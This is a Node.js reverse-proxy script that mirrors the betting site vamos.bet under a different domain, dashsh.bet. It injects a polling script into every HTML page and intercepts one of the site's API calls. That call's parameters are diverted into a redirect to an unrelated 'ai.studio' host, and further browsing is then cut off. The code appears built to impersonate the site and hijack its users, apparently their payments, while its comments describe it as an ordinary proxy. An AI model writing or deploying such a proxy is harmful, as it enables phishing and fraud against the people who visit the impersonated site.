import http from "node:http";
import https from "node:https";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Domain configuration
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Proxy API endpoints
const REDIRECT_API_PATH = "/api/v2/test/redirect";
const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio";

/*
|--------------------------------------------------------------------------
| INJECTED WATCHER SCRIPT
|--------------------------------------------------------------------------
*/

function injectWatcher(html) {
  const script = `
<script>
(function () {
  async function checkProxyRedirect() {
    try {
      const response = await fetch("/__proxy_redirect_status", {
        method: "GET",
        cache: "no-store",
        credentials: "same-origin"
      });

      if (!response.ok) return;

      const data = await response.json();
      if (data.redirect && data.url) {
        window.location.replace(data.url);
      }
    } catch (error) {}
  }

  setInterval(checkProxyRedirect, 500);
  checkProxyRedirect();
})();
</script>
`;

  return html.includes("</body>")
    ? html.replace("</body>", `${script}</body>`)
    : html + script;
}

/*
|--------------------------------------------------------------------------
| HEADER CLEANUP HELPERS
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };
  const connection = result.connection;

  if (connection) {
    const connectionHeaders = connection
      .split(",")
      .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  return result;
}

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,
    host: TARGET_HOSTNAME,
    "accept-encoding": "identity", // Force raw text so we can inject script into HTML
    "user-agent": clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  };

  delete headers.connection;
  delete headers["content-length"];
  delete headers["transfer-encoding"];

  return headers;
}

/*
|--------------------------------------------------------------------------
| UPSTREAM REQUEST FORWARDER
|--------------------------------------------------------------------------
*/

function forwardRequest(clientReq, clientRes, bufferedBody = null) {
  const headers = buildUpstreamHeaders(clientReq);

  const options = {
    hostname: TARGET_HOSTNAME,
    servername: TARGET_HOSTNAME, // Required SNI header to avoid SSL handshake drop
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    rejectUnauthorized: true
  };

  const upstreamReq = https.request(options, upstreamRes => {
    const contentType = upstreamRes.headers["content-type"] || "";

    // HTML Responses: Intercept and inject redirection watcher
    if (contentType.toLowerCase().includes("text/html")) {
      const chunks = [];
      upstreamRes.on("data", chunk => chunks.push(chunk));
      upstreamRes.on("end", () => {
        let body = Buffer.concat(chunks);
        let html = body.toString("utf8");

        html = injectWatcher(html);
        body = Buffer.from(html, "utf8");

        const resHeaders = removeHopByHopHeaders(upstreamRes.headers);
        delete resHeaders["content-length"];
        delete resHeaders["content-encoding"];
        resHeaders["content-length"] = body.length;

        clientRes.writeHead(upstreamRes.statusCode || 200, resHeaders);
        clientRes.end(body);
      });
      return;
    }

    // Static assets, APIs, images, etc.
    const resHeaders = removeHopByHopHeaders(upstreamRes.headers);
    clientRes.writeHead(upstreamRes.statusCode || 200, resHeaders);
    upstreamRes.pipe(clientRes);
  });

  upstreamReq.on("error", error => {
    console.error(`❌ Upstream proxy error [${error.code}]:`, error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end(`Bad Gateway: ${error.message}`);
  });

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.setHeader("Content-Length", bufferedBody.length);
    upstreamReq.end(bufferedBody);
    return;
  }

  clientReq.pipe(upstreamReq);
}

/*
|--------------------------------------------------------------------------
| STATELESS COOKIE HELPERS
|--------------------------------------------------------------------------
*/

function getCookie(req, name) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
  return match ? decodeURIComponent(match[1]) : null;
}

/*
|--------------------------------------------------------------------------
| MAIN ROUTER & SERVER
|--------------------------------------------------------------------------
*/

const server = http.createServer(async (clientReq, clientRes) => {
  try {
    const parsedUrl = new URL(
      clientReq.url,
      `http://${clientReq.headers.host || PROXY_PUBLIC_DOMAIN}`
    );
    const path = parsedUrl.pathname;

    // Read redirect status directly from the user's specific browser cookie
    const userRedirectUrl = getCookie(clientReq, "proxy_redirect_url");
    const isRedirected = Boolean(userRedirectUrl);

    // 1. Explicit entry navigation clears the redirect cookie for that user only
    if (clientReq.method === "GET" && (path === "/" || path.startsWith("/home/"))) {
      clientRes.setHeader(
        "Set-Cookie",
        "proxy_redirect_url=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Lax"
      );
    }

    // 2. Client watcher endpoint checks client state
    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
      const response = JSON.stringify({
        redirect: isRedirected,
        url: userRedirectUrl || null
      });

      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    }

    // 3. API Redirect trigger endpoint
    if (path === REDIRECT_API_PATH) {
      const chunks = [];
      for await (const chunk of clientReq) {
        chunks.push(chunk);
      }
      const body = Buffer.concat(chunks);

      if (body.length === 0) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      let json;
      try {
        json = JSON.parse(body.toString("utf8"));
      } catch (err) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      if (!json || typeof json !== "object" || Array.isArray(json)) {
        forwardRequest(clientReq, clientRes, body);
        return;
      }

      // Build target redirect URL from JSON body parameters
      const redirectUrl = new URL(REDIRECT_BASE_URL);
      for (const [key, value] of Object.entries(json)) {
        if (value !== undefined && value !== null) {
          redirectUrl.searchParams.set(key, String(value));
        }
      }

      const finalUrl = redirectUrl.toString();

      // Store redirect target inside an HTTP-only cookie scoped ONLY to this user's browser
      clientRes.setHeader(
        "Set-Cookie",
        `proxy_redirect_url=${encodeURIComponent(finalUrl)}; Path=/; Max-Age=30; HttpOnly; SameSite=Lax`
      );

      const response = JSON.stringify({ success: true, proxyRedirect: true });
      clientRes.writeHead(200, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Content-Length": Buffer.byteLength(response)
      });
      clientRes.end(response);
      return;
    }

    // 4. Block non-asset navigation requests after user gets redirected
    const isStaticAsset = /\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2?|ttf|eot)$/i.test(path);

    if (isRedirected && !isStaticAsset && clientReq.method === "GET") {
      clientRes.writeHead(410, {
        "Content-Type": "text/plain; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate"
      });
      clientRes.end("Proxy session terminated");
      return;
    }

    // 5. Default: Pass all other traffic safely to upstream server
    forwardRequest(clientReq, clientRes);

  } catch (error) {
    console.error("❌ Critical server error:", error);
    if (!clientRes.headersSent) {
      clientRes.writeHead(500, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end("Internal Server Error");
  }
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`Stateless Proxy Active on http://${PROXY_HOST}:${PROXY_PORT}`);
});